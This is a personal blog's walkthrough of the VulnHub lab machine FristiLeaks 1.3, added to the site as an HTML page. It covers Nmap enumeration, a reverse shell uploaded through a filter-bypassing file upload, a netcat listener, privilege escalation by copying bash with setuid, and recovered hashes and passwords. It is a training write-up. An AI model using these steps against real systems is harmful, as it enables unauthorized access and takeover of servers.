@@ -1,0 +1,252 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8"/>
+    <meta name="author" content="Ankur Tyagi (@7h3rAm)"/>
+    <meta name="description" content="Personal Weblog"/>
+    <meta content="width=device-width, initial-scale=1" name="viewport"/>
+    <title>मंथन | Manthan</title>
+    <link rel="icon" type="image/webp" sizes="32x32" href="/static/images/manthan-32x32.png.webp"/>
+    <link rel="stylesheet" type="text/css" media="screen" href="/static/css/style.css"/>
+    <link rel="stylesheet" href="/static/css/atelier-forest-light.css">
+    <!-- <link rel="stylesheet" href="/static/css/atom-one-light.min.css"> -->
+    <!-- <link rel="stylesheet" href="/static/css/default.min.css"> -->
+    <!-- <link rel="stylesheet" href="/static/css/docco.min.css"> -->
+    <!-- <link rel="stylesheet" href="/static/css/github-gist.min.css"> -->
+    <!-- <link rel="stylesheet" href="/static/css/github.min.css"> -->
+    <!-- <link rel="stylesheet" href="/static/css/zenburn.min.css"> -->
+    <script charset="UTF-8" src="/static/js/highlight.min.js"></script>
+    <script charset="UTF-8" src="/static/js/highlightjs-line-numbers.min.js"></script>
+    <script charset="UTF-8" src="/static/js/go.min.js"></script>
+   </head>
+  <body>
+    <div class="body">
+      <div class="topmenu">
+        <table>
+          <tr>
+            <td colspan="3"><a class="menu_home" href="/index.html">मंथन</a></td>
+          </tr>
+          <tr>
+            <td><a class="menu_archive" href="/archive.html">💾 Archive</a></td>
+            <td><a class="menu_tags" href="/tags.html">🔖 Tags</a></td>
+            <td><a class="menu_stats" href="/stats.html">📊 Stats</a></td>
+          </tr>
+        </table>
+      </div>
+      <div class="content">
+          <hr>
+  <h1 class="h1 title collapsible" onclick="toggle(this);">[VulnHub] FristiLeaks: 1.3</h1>
+    <div class="title"><code><span class="sparklines"><span style="color:#e83e8c;">▆</span><span style="color:#00bcd4;">▇</span><span style="color:#ffcc66;">▆</span><span style="color:#99cc99;">▃</span><span style="color:#6c757d;">▅</span><span style="color:#4caf50;">▄</span><span style="color:#00bcd4;">▃</span><span style="color:#20b2aa;">▁</span><span style="color:#6610f2;">▆</span><span style="color:#f44336;">▂</span><span style="color:#a50b5e;">▇</span><span style="color:#17a2b8;">▃</span><span style="color:#0c9;">▇</span><span style="color:#6f42c1;">▇</span><span style="color:#6610f2;">▂</span><span style="color:#fd7e14;">▁</span><span style="color:#dc3545;">▇</span><span style="color:#28a745;">█</span><span style="color:#6c757d;">▅</span><span style="color:#69359c;">▁</span><span style="color:#6610f2;">▄</span><span style="color:#ffc107;">▄</span><span style="color:#0c9;">▆</span><span style="color:#fd7e14;">▂</span><span style="color:#99cc99;">▂</span><span style="color:#8357ff;">▂</span><span style="color:#28a745;">▃</span><span style="color:#28a745;">▃</span><span style="color:#20b2aa;">▄</span><span style="color:#0c9;">▂</span><span style="color:#dc3545;">▃</span><span style="color:#8357ff;">▇</span><span style="color:#00b7eb;">▃</span><span style="color:#e83e8c;">▇</span><span style="color:#6610f2;">▁</span><span style="color:#ffc107;">▄</span><span style="color:#20c997;">▄</span><span style="color:#0c9;">▇</span><span style="color:#6610f2;">▃</span><span style="color:#6f42c1;">▃</span><span style="color:#6610f2;">▂</span><span style="color:#fd7e14;">▁</span><span style="color:#5b92e5;">▁</span><span style="color:#ffcc66;">▅</span><span style="color:#ffcc66;">▆</span><span style="color:#2196f3;">▅</span><span style="color:#4caf50;">▇</span><span style="color:#6f42c1;">▇</span><span style="color:#6610f2;">▅</span><span style="color:#00bcd4;">▁</span><span style="color:#5b92e5;">▁</span><span style="color:#0c9;">▁</span><span style="color:#69359c;">▄</span><span style="color:#f44336;">▂</span><span style="color:#20c997;">▃</span><span style="color:#8357ff;">▁</span><span style="color:#28a745;">▂</span><span style="color:#8357ff;">▁</span><span style="color:#dc3545;">▁</span><span style="color:#17a2b8;">▅</span><span style="color:#007bff;">▁</span><span style="color:#6c757d;">▂</span><span style="color:#007bff;">▇</span><span style="color:#f44336;">▂</span></span></code></div>
+    <hr>
+          <p style="float:left;"><a href="/posts/20190910_vulnhub-dc6.html"> « </a>📅 published on <code>11/Sep/2019</code><a href="/posts/20190917_vulnhub-escalatelinux.html"> » </a></p>
+        <p style="float:right;">🔖 tagged <a href=/tags.html#vulnhub>vulnhub</a> and <a href=/tags.html#writeup>writeup</a></p>
+    <div style="clear:both;"></div>
+    <hr><h2 class="h2 collapsible" onclick="toggle(this);">Overview</h2>
+<p class="nested active">This is a writeup for VulnHub VM <a href="https://www.vulnhub.com/entry/fristileaks-13,133/">FristiLeaks: 1.3</a>. Here are stats for this machine from <a href="https://github.com/7h3rAm/machinescli">machinescli</a>:</p>
+<p class="nested active"><img alt="writeup.overview.machinescli" src="/static/files/posts_vulnhub_fristileaks1dot3/machinescli.png.webp" /></p>
+<h3 class="h3 collapsible" onclick="toggle(this);">Killchain</h3>
+<p class="nested active">Here's the killchain (<code>enumeration</code> → <code>exploitation</code> → <code>privilege escalation</code>) for this machine:</p>
+<p class="nested active"><img alt="writeup.overview.killchain" src="/static/files/posts_vulnhub_fristileaks1dot3/killchain.png.webp" /></p>
+<h3 class="h3 collapsible" onclick="toggle(this);">TTPs</h3>
+<p class="nested active">1. <code>80/tcp/http/Apache httpd 2.2.15 ((CentOS) DAV/2 PHP/5.3.3)</code>: <a href="https://github.com/7h3rAm/writeups#exploit_php_fileupload">exploit_php_fileupload</a>, <a href="https://github.com/7h3rAm/writeups#exploit_php_fileupload_bypass">exploit_php_fileupload_bypass</a>, <a href="https://github.com/7h3rAm/writeups#privesc_sudo">privesc_sudo</a>, <a href="https://github.com/7h3rAm/writeups#privesc_setuid">privesc_setuid</a>  </p>
+<hr><h2 class="h2 collapsible" onclick="toggle(this);">Phase #1: Enumeration</h2>
+<p class="nested active">1. Here's the Nmap scan result:  </p>
+<pre class="nested active"><code># Nmap 7.70 scan initiated Wed Sep 11 13:59:40 2019 as: nmap -vv --reason -Pn -sV -sC --version-all -oN /root/toolbox/vulnhub/fristileaks1.3/results/192.168.92.133/scans/_quick_tcp_nmap.txt -oX /root/toolbox/vulnhub/fristileaks1.3/results/192.168.92.133/scans/xml/_quick_tcp_nmap.xml 192.168.92.133
+Nmap scan report for 192.168.92.133
+Host is up, received arp-response (0.00099s latency).
+Scanned at 2019-09-11 13:59:41 PDT for 13s
+Not shown: 999 filtered ports
+Reason: 992 no-responses and 7 host-prohibiteds
+PORT   STATE SERVICE REASON         VERSION
+80/tcp open  http    syn-ack ttl 64 Apache httpd 2.2.15 ((CentOS) DAV/2 PHP/5.3.3)
+| http-methods:
+|   Supported Methods: GET HEAD POST OPTIONS TRACE
+|_  Potentially risky methods: TRACE
+| http-robots.txt: 3 disallowed entries
+|_/cola /sisi /beer
+|_http-server-header: Apache/2.2.15 (CentOS) DAV/2 PHP/5.3.3
+|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
+MAC Address: 08:00:27:A5:A6:76 (Oracle VirtualBox virtual NIC)
+
+Read data files from: /usr/bin/../share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Wed Sep 11 13:59:54 2019 -- 1 IP address (1 host up) scanned in 14.00 seconds
+</code></pre>
+
+<p class="nested active">2. Here a summary of open ports and associated <a href="https://github.com/Tib3rius/AutoRecon">AutoRecon</a> scan files:</p>
+<p class="nested active"><img alt="writeup.enumeration.steps.2.1" src="/static/files/posts_vulnhub_fristileaks1dot3/openports.png.webp" />  </p>
+<p class="nested active">3. We find references to 3 directories from <code>robots.txt</code>:  </p>
+<pre class="nested active"><code>http://192.168.92.133/cola
+http://192.168.92.133/sisi
+http://192.168.92.133/beer
+</code></pre>
+
+<p class="nested active"><img alt="writeup.enumeration.steps.3.1" src="/static/files/posts_vulnhub_fristileaks1dot3/screenshot01.png.webp" />  </p>
+<p class="nested active">4. These directories don't have anything useful other than a meme image. Since all these directory names are references to drinks and the name of this VM also referes to one, we try <code>http://192.168.92.133/fristi</code> and are presented with a login page:  </p>
+<p class="nested active"><img alt="writeup.enumeration.steps.4.1" src="/static/files/posts_vulnhub_fristileaks1dot3/screenshot02.png.webp" />  </p>
+<h3 class="h3 collapsible" onclick="toggle(this);">Findings</h3>
+<h4 class="h4 collapsible" onclick="toggle(this);">Open Ports</h4>
+<pre class="nested active"><code>80/tcp  |  http  |  Apache httpd 2.2.15 ((CentOS) DAV/2 PHP/5.3.3)
+</code></pre>
+
+<h4 class="h4 collapsible" onclick="toggle(this);">Files</h4>
+<pre class="nested active"><code>http://192.168.92.133/robots.txt
+http://192.168.92.133/fristi
+</code></pre>
+
+<h4 class="h4 collapsible" onclick="toggle(this);">Users</h4>
+<pre class="nested active"><code>ssh: eezeepz, admin, fristigod
+</code></pre>
+
+<hr><h2 class="h2 collapsible" onclick="toggle(this);">Phase #2: Exploitation</h2>
+<p class="nested active">1. The source of this page hints at a possible username <code>eezeepz</code> and password encoded within an image embedded as Base64 data in this source:  </p>
+<pre class="nested active"><code>eezeepz/keKkeKKeKKeKkEkkEk
+</code></pre>
+
+<p class="nested active"><img alt="writeup.exploitation.steps.1.1" src="/static/files/posts_vulnhub_fristileaks1dot3/screenshot02a.png.webp" />  </p>
+<p class="nested active"><img alt="writeup.exploitation.steps.1.2" src="/static/files/posts_vulnhub_fristileaks1dot3/screenshot02b.png.webp" />  </p>
+<p class="nested active">2. We login using these credentials and are presented with a file upload page. We create a PHP reverse shell, add <code>GIF89a</code> magic byte to it start and rename it as <code>rs.php.gif</code> to evade filters and upload the file. Once uploaded the applications informs us of the upload directory as well:  </p>
+<pre class="nested active"><code>rs.php.gif → http://192.168.92.133/fristi/uploads/rs.php.gif
+</code></pre>
+
+<p class="nested active"><img alt="writeup.exploitation.steps.2.1" src="/static/files/posts_vulnhub_fristileaks1dot3/screenshot03.png.webp" />  </p>
+<p class="nested active">3. We start a Netcat listener, issue a request for this file using <code>curl</code> and are presented with the initial shell:  </p>
+<pre class="nested active"><code>nc -nlvp 443
+curl -v &quot;http://192.168.92.133/fristi/uploads/rs.php.gif&quot;
+</code></pre>
+
+<p class="nested active"><img alt="writeup.exploitation.steps.3.1" src="/static/files/posts_vulnhub_fristileaks1dot3/screenshot04.png.webp" />  </p>
+<p class="nested active"><img alt="writeup.exploitation.steps.3.2" src="/static/files/posts_vulnhub_fristileaks1dot3/screenshot05.png.webp" />  </p>
+<hr><h2 class="h2 collapsible" onclick="toggle(this);">Phase #2.5: Post Exploitation</h2>
+<pre class="nested active"><code>apache@localhost.localdomain&gt; id
+uid=48(apache) gid=48(apache) groups=48(apache)
+apache@localhost.localdomain&gt;  
+apache@localhost.localdomain&gt; uname
+Linux localhost.localdomain 2.6.32-573.8.1.el6.x86_64 #1 SMP Tue Nov 10 18:01:38 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux
+apache@localhost.localdomain&gt;  
+apache@localhost.localdomain&gt; ifconfig
+eth0  Link encap:Ethernet  HWaddr 08:00:27:A5:A6:76
+      inet addr:192.168.92.133  Bcast:192.168.92.255  Mask:255.255.255.0
+      inet6 addr: fe80::a00:27ff:fea5:a676/64 Scope:Link
+      UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+      RX packets:343696 errors:0 dropped:0 overruns:0 frame:0
+      TX packets:199868 errors:0 dropped:0 overruns:0 carrier:0
+      collisions:0 txqueuelen:1000
+      RX bytes:28339698 (27.0 MiB)  TX bytes:30059387 (28.6 MiB)
+apache@localhost.localdomain&gt;  
+apache@localhost.localdomain&gt; users
+eezeepz
+admin
+fristigod
+</code></pre>
+
+<hr><h2 class="h2 collapsible" onclick="toggle(this);">Phase #3: Privilege Escalation</h2>
+<p class="nested active">1. Exploring the filesystem, we come across <code>/var/www/notex.txt</code> file. This file hints looking at the contents of user <code>eezeepz</code>'s home directory:  </p>
+<pre class="nested active"><code>cd /var/www
+cat notes.txt
+</code></pre>
+
+<p class="nested active"><img alt="writeup.privesc.steps.1.1" src="/static/files/posts_vulnhub_fristileaks1dot3/screenshot06.png.webp" />  </p>
+<p class="nested active">2. We find another interesting file at <code>/home/eezeepz/notes.txt</code> which hints at a possible privesc method:  </p>
+<pre class="nested active"><code>cd /home/eezeepz
+cat notes.txt
+</code></pre>
+
+<p class="nested active"><img alt="writeup.privesc.steps.2.1" src="/static/files/posts_vulnhub_fristileaks1dot3/screenshot07.png.webp" />  </p>
+<p class="nested active">3. As suggested in the notes file, we create a file <code>/tmp/runthis</code> to execute a command starting with <code>/usr/bin</code> followed by directory traversal strings to copy the <code>bash</code> shell into <code>/tmp</code> directory and setuid on it. Since these commadns are executed within the scope of user <code>admin</code>, wehn we run the <code>/tmp/bash</code> file, we get a shell as user <code>admin</code>:  </p>
+<pre class="nested active"><code>echo -e &quot;/usr/bin/../../bin/cp /bin/bash /tmp/bash; chmod u+s /tmp/bash&quot; &gt;/tmp/runthis
+/tmp/bash -p
+</code></pre>
+
+<p class="nested active"><img alt="writeup.privesc.steps.3.1" src="/static/files/posts_vulnhub_fristileaks1dot3/screenshot07a.png.webp" />  </p>
+<p class="nested active">4. We move into <code>/home/admin</code> directory and find a reversed, Base64 encoded string within <code>whoisyourgodnow.txt</code> file, that is owned by user <code>fristigod</code>. We also find a Python script <code>cryptpass.py</code> in this directory. Looking at the script, we reverse the encoding process and add a decoding method to it. Testing updated script with <code>=RFn0AKnlMHMPIzpyuTI0ITG</code> reveals the password for user <code>fristigod</code> to be <code>LetThereBeFristi!</code>. We the use <code>su</code> to switch user:  </p>
+<pre class="nested active"><code>cat whoisyourgodnow.txt
+cat cryptpass.py
+python cryptpass.py =RFn0AKnlMHMPIzpyuTI0ITG
+su - fristigod
+</code></pre>
+
+<p class="nested active"><img alt="writeup.privesc.steps.4.1" src="/static/files/posts_vulnhub_fristileaks1dot3/screenshot07b.png.webp" />  </p>
+<p class="nested active"><img alt="writeup.privesc.steps.4.2" src="/static/files/posts_vulnhub_fristileaks1dot3/screenshot07c.png.webp" />  </p>
+<p class="nested active">5. Looking at the file <code>cryptedpass.txt</code>, which is owned by user <code>admin</code>, we see a similar encoded string as before and repeat the process to get decoded the decoded password <code>thisisalsopw123</code>. We use this to switch user:  </p>
+<pre class="nested active"><code>cat cryptedpass.txt
+cat cryptpass.py
+python cryptpass.py mVGZ3O3omkJLmy2pcuTq
+su - admin
+</code></pre>
+
+<p class="nested active"><img alt="writeup.privesc.steps.5.1" src="/static/files/posts_vulnhub_fristileaks1dot3/screenshot07d.png.webp" />  </p>
+<p class="nested active"><img alt="writeup.privesc.steps.5.2" src="/static/files/posts_vulnhub_fristileaks1dot3/screenshot07e.png.webp" />  </p>
+<p class="nested active">6. We return to being user <code>fristigod</code> and explore their home directory. Within the <code>./bash_history</code> file we find references to a local, setuid file <code>.secret_admin_stuff/doCom</code>:  </p>
+<pre class="nested active"><code>cd /home/fristigod
+cat .bash_history
+</code></pre>
+
+<p class="nested active"><img alt="writeup.privesc.steps.6.1" src="/static/files/posts_vulnhub_fristileaks1dot3/screenshot07f.png.webp" />  </p>
+<p class="nested active"><img alt="writeup.privesc.steps.6.2" src="/static/files/posts_vulnhub_fristileaks1dot3/screenshot07g.png.webp" />  </p>
+<p class="nested active">7. Using examples from <code>.bash_history</code>, we run the setuid file to execute <code>/bin/bash</code> and gain elevated privileges:  </p>
+<pre class="nested active"><code>sudo -u fristi ./doCom &quot;/bin/bash&quot;
+</code></pre>
+
+<p class="nested active"><img alt="writeup.privesc.steps.7.1" src="/static/files/posts_vulnhub_fristileaks1dot3/screenshot08.png.webp" />  </p>
+<p class="nested active">8. We then explore <code>root</code>'s home directory and find the flag within <code>/root/fristileaks_secrets.txt</code> file:  </p>
+<pre class="nested active"><code>cd /root
+cat fristileaks_secrets
+</code></pre>
+
+<p class="nested active"><img alt="writeup.privesc.steps.8.1" src="/static/files/posts_vulnhub_fristileaks1dot3/screenshot09.png.webp" />  </p>
+<hr><h2 class="h2 collapsible" onclick="toggle(this);">Loot</h2>
+<h3 class="h3 collapsible" onclick="toggle(this);">Hashes</h3>
+<pre class="nested active"><code>root:$6$qAoeosiW$fsOy8H/VKux.9K0T3Ww2D3FPNlO5LAaFytx/6t69Q7LPDSS/nNiP4xzq0Qab.Iz3uy5fYdH3Aw/K5v3ZM........................
+eezeepz:$6$djF4bN.s$JWhT7wJo37fgtuJ.be2Q62PnM/AogXuqGa.PgRzrMGv9/Th0aixBXl8Usy9.RkO1ZRAQ/UM3xP7oGWu9z........................
+admin:$6$NPXhvENr$yG4a5RpaLpL5UDRRZ3Ts0eZadZfFFbYpI1kyNJp9rND0AySx2FhYSmAvY.91UzETJVvZcDjWb2pp85uLA........................
+fristigod:$6$0WqnZlI/$gIzMByP7rH21W3neA.uHYZZg5aM7gI1xtOj8WwgoK1QgQh2LWL0nQBJau/mGcOSxLbaGJhJjM.6HNJTW.........................
+</code></pre>
+
+<h3 class="h3 collapsible" onclick="toggle(this);">Credentials</h3>
+<pre class="nested active"><code>ssh: admin/thisisalsop...., fristigod/LetThereBeF......
+http: eezeepz/keKkeKKeKKeKk.....
+</code></pre>
+
+<h3 class="h3 collapsible" onclick="toggle(this);">Flags</h3>
+<pre class="nested active"><code>Y0u_kn0w_y0u_l0ve_f.....
+</code></pre>
+
+<hr><h2 class="h2 collapsible" onclick="toggle(this);">References</h2>
+<ul class="nested active">
+<li><a href="https://www.vulnhub.com/entry/fristileaks-13,133/">https://www.vulnhub.com/entry/fristileaks-13,133/</a>  </li>
+<li><a href="https://highon.coffee/blog/fristileaks-walkthrough/">https://highon.coffee/blog/fristileaks-walkthrough/</a>  </li>
+<li><a href="https://kongwenbin.wordpress.com/2017/12/31/write-up-for-fristileaks-v1-3-vulnhub/">https://kongwenbin.wordpress.com/2017/12/31/write-up-for-fristileaks-v1-3-vulnhub/</a>  </li>
+</ul>
+    <hr>
+          <p style="float:left;">« <a href="/posts/20190910_vulnhub-dc6.html">[VulnHub] DC: 6</a> «</p>
+      <p style="float:right;">» <a href="/posts/20190917_vulnhub-escalatelinux.html">[VulnHub] Escalate_Linux: 1</a> »</p>
+          </div>
+      <div><a class="footer" href="https://github.com/7h3rAm/7h3rAm.github.io">  </a></div>
+      <script>hljs.initHighlightingOnLoad();</script>
+      <script>hljs.initLineNumbersOnLoad();</script>
+      <script>
+        function toggle(s){
+          s.classList.toggle("expanded");
+          var t=!1,i=!1,a=!1;
+          s.classList.contains("h2")&&(t=!0),s.classList.contains("h3")&&(i=!0),s.classList.contains("h4")&&(a=!0);
+          for(var l=s.nextElementSibling;l;){
+            if(t&&l.classList.contains("h2")){
+              l.classList.toggle("active");
+              break
+            }
+            if(i&&(l.classList.contains("h2")||l.classList.contains("h3"))){
+              l.classList.toggle("active");
+              break
+            }
+            if(a&&(l.classList.contains("h2")||l.classList.contains("h3")||l.classList.contains("h4"))){
+              l.classList.toggle("active");
+              break
+            }
+            l.classList.contains("collapsible")&&l.classList.toggle("expanded"),l.classList.toggle("active"),l=l.nextElementSibling
+          }
+        }
+      </script>
+    </div>
+  </body>
+</html>
